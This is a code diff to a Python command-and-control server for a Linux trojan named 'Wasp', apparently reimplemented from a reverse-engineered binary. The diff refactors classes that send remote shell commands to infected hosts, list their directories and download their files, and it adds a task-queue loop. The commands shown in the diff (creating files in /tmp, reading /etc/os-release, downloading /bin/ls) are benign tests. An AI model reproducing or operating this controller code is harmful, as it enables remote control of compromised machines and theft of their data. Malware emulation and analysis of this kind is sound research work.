@@ -16,13 +16,10 @@ from typing import Dict, List, Optional
 
 import logging
 
-logging.basicConfig(level=logging.DEBUG)
-logger = logging.getLogger("wasp")
+from constants import WASP_HOME, WASPS_PATH, logger
+from wasp_types import WaspException, WaspMalware, WaspCommand, WaspResponse
+from wasp_commands import WaspCommandExecute, WaspCommandFileList, WaspCommandDownload, WaspCommandHandshake
 
-WASP_HOME = Path.home() / ".wasp"
-WASP_HOME.mkdir(parents=False, exist_ok=True)
-
-WASPS_PATH = WASP_HOME / "wasps"
 
 # This is used in the "Handshake" method to authenticate between clients and servers
 # TODO: We should patch the binary so it uses a different value
@@ -55,181 +52,6 @@ class WaspSimpleCipher(WaspCipher):
             self.offset = self.offset % len(cipher_bytes)
         return encrypted_bytes
 
-class WaspException(Exception):
-    pass
-
-class WaspCommand(object):
-    # TODO: Associate response type
-    # TODO: Provide callback for response maybe??
-    logger: logging.Logger = logger.getChild("WaspCommand")
-    wasp: WaspMalware
-
-    def __init__(self, wasp: WaspMalware) -> None:
-        self.wasp = wasp
-
-    def get_dict(self) -> Dict:
-        raise NotImplementedError()
-
-    def get_json(self) -> str:
-        return json.dumps(self.get_dict())
-
-    def pack(self) -> bytes:
-        encoded = self.get_json().encode('utf-8')
-        return struct.pack("!I", len(encoded)) + encoded
-
-    def __repr__(self) -> str:
-        return json.dumps(self.get_dict(), sort_keys=True, indent=2)
-
-    def handle_response(self, response: WaspResponse):
-        output: Optional[bytes | str] = None
-        try:
-            output = response.data.decode('utf-8')
-        except UnicodeDecodeError:
-            output = base64.b64encode(response.data).decode('utf-8')
-        self.logger.info(f"Result: {output}")
-        raise NotImplementedError()
-
-class WaspCommandHandshake(WaspCommand):
-    def __init__(self, wasp = None) -> None:
-        super().__init__(wasp)
-
-    def get_dict(self) -> Dict:
-        return {
-            "uri": 'handshake'
-        }
-
-class WaspCommandDownload(WaspCommand):
-    path: Path
-    breakpoint: bool = True
-    start: int = 0
-    end: int = 1024
-
-
-    def __init__(self, wasp: WaspMalware, path: Path | str) -> None:
-        super().__init__(wasp)
-        if isinstance(path, str):
-            path = Path(path)
-        self.path = path
-
-    def get_dict(self) -> Dict:
-        return {
-            'uri': 'download',
-            'headers': {
-                'File-Path': str(self.path),
-                # @ 0x418b92
-                #'Accept-Encoding': 'gzip',
-                # @ 0x434910
-                'Break-Point': self.breakpoint,
-                'Begin-Position': self.start,
-                'End-Position': self.end,
-            },
-        }
-
-    def handle_response(self, response: WaspResponse):
-        # TODO: Handle Windows??
-        destination_directory = self.wasp.collection_directory / "files" / Path(str(self.path)[1:]).parent
-        destination_directory.mkdir(parents=True, exist_ok=True)
-        destination = destination_directory / self.path.name
-        destination.write_bytes(response.data)
-
-
-class WaspCommandFileList(WaspCommand):
-    path: Path
-    logger: logging.Logger = logger.getChild('WaspCommandFileList')
-
-    def __init__(self, wasp: WaspMalware, path: Path | str) -> None:
-        super().__init__(wasp)
-        if isinstance(path, str):
-            path = Path(path)
-        self.path = path
-
-
-    def get_dict(self) -> Dict:
-        return {
-            'uri': 'filelist',
-            'headers': {
-                'File-Path': str(self.path),
-            },
-        }
-
-    def handle_response(self, response: WaspResponse):
-        listing_text: str = response.data.decode('utf-8')
-        self.logger.info(f"\nIs File\tSize\tName\n{listing_text}")
-        
-             
-
-class WaspCommandExecute(WaspCommand):
-    command: str
-    logger: logging.Logger = logger.getChild("Execute")
-    def __init__(self, wasp: WaspMalware, command: str):
-        super().__init__(wasp)
-        self.command = command
-
-    def get_dict(self) -> Dict:
-        return {
-            "uri": "command",
-            "headers": {
-                "Command-Line": self.command
-            }
-        }
-
-    def handle_response(self, response: WaspResponse):
-        output: Optional[bytes | str] = None
-        try:
-            output = response.data.decode('utf-8')
-        except UnicodeDecodeError:
-            output = base64.b64encode(response.data).decode('utf-8')
-        self.logger.info(f"Command: {self.command}")
-        self.logger.info(f"Result: {output}")
-        return output
-
-
-class WaspResponse(object):
-    metadata: Dict = {}
-    data: bytes = b''
-
-    def __init__(self, metadata: Dict, data: bytes):
-        self.metadata = metadata
-        self.data = data
-
-
-class WaspConnectionType(Enum):
-    PRIMARY = "main"
-    SECONDARY = "child" # TODO: Maybe child? or secondary? Or fallback
-
-class WaspPlatform(Enum):
-    LINUX = "Linux"
-
-class WaspArchitecture(Enum):
-    x86_64 = "x86_64"
-
-class WaspMalware(object):
-    connection_type: WaspConnectionType = WaspConnectionType.PRIMARY
-    wasp_id: str
-
-    hostname: Optional[str] = None
-    local_ip: Optional[str] = None
-    architecture: Optional[WaspArchitecture] = None
-    operating_system: Optional[str] = None
-    platform: Optional[WaspPlatform] = None
-
-    collection_directory: Path
-
-    def __init__(self, response: WaspResponse) -> None:
-        meta = response.metadata
-        headers = meta.get("headers", {})
-        self.connection_type = WaspConnectionType(headers.get("connection-Type", "main"))
-        self.wasp_id = headers.get("Trojan-ID", uuid.uuid4())
-
-        self.collection_directory = WASPS_PATH / str(self.wasp_id) / "collection"
-        self.collection_directory.mkdir(parents=True, exist_ok=True)
-
-        self.hostname = headers.get("Trojan-Hostname")
-        self.local_ip = headers.get("Trojan-IP")
-        self.architecture = WaspArchitecture(headers.get("Trojan-Machine", "Unknown"))
-        self.operating_system = headers.get("Trojan-OSersion")
-        self.platform = WaspPlatform(headers.get('Trojan-Platform'))
-
 class WaspServer(socketserver.BaseRequestHandler):
     logger: logging.Logger = logger.getChild("C2")
 
@@ -252,26 +74,31 @@ class WaspServer(socketserver.BaseRequestHandler):
         #t = threading.Thread(target=self.run_receive_thread)
         #t.start()
 
-        commands: List[WaspCommand] = []
+        while self.wasp.has_tasks():
+            commands: List[WaspCommand] = self.wasp.get_tasks()
 
-        commands.append(WaspCommandExecute(self.wasp, '/bin/touch /tmp/hello'))
-        commands.append(WaspCommandExecute(self.wasp, '/bin/echo wasp > /tmp/hello'))
-        commands.append(WaspCommandExecute(self.wasp, 'ln -s /tmp/hello /tmp/goodbye'))
-        commands.append(WaspCommandExecute(self.wasp, 'mkdir /tmp/a_dir'))
-        commands.append(WaspCommandExecute(self.wasp, 'cat /etc/os-release > /tmp/os-release'))
-        commands.append(WaspCommandFileList(self.wasp, '/tmp'))
-        commands.append(WaspCommandDownload(self.wasp, '/tmp/hello'))
-        commands.append(WaspCommandDownload(self.wasp, '/bin/ls'))
-        commands.append(WaspCommandDownload(self.wasp, '/tmp/os-release'))
-        commands.append(WaspCommandDownload(self.wasp, '/etc/os-release'))
-        commands.append(WaspCommandExecute(self.wasp, '/bin/echo after listing'))
+            """
+            # TODO: Write integration tests!
+            commands.append(WaspCommandExecute(self.wasp, '/bin/touch /tmp/hello'))
+            commands.append(WaspCommandExecute(self.wasp, '/bin/echo wasp > /tmp/hello'))
+            commands.append(WaspCommandExecute(self.wasp, 'ln -s /tmp/hello /tmp/goodbye'))
+            commands.append(WaspCommandExecute(self.wasp, 'mkdir /tmp/a_dir'))
+            commands.append(WaspCommandExecute(self.wasp, 'cat /etc/os-release > /tmp/os-release'))
+            commands.append(WaspCommandFileList(self.wasp, '/tmp'))
+            commands.append(WaspCommandDownload(self.wasp, '/tmp/hello'))
+            commands.append(WaspCommandDownload(self.wasp, '/bin/ls'))
+            commands.append(WaspCommandDownload(self.wasp, '/tmp/os-release'))
+            commands.append(WaspCommandDownload(self.wasp, '/etc/os-release'))
+            commands.append(WaspCommandExecute(self.wasp, '/bin/echo after listing'))
+            """
 
-        for command in commands:
-            self.send_command(command)
-            response = self.receive_result()
-            if response:
-                command.handle_response(response)
-        while True: pass
+            for command in commands:
+                self.send_command(command)
+                response = self.receive_result()
+                if response:
+                    command.handle_response(response)
+                    command.mark_complete()
+        self.logger.info(f"No more tasks for {self.wasp}")
 
     def handshake_from_wasp(self) -> WaspMethod:
         # Get config from wasp
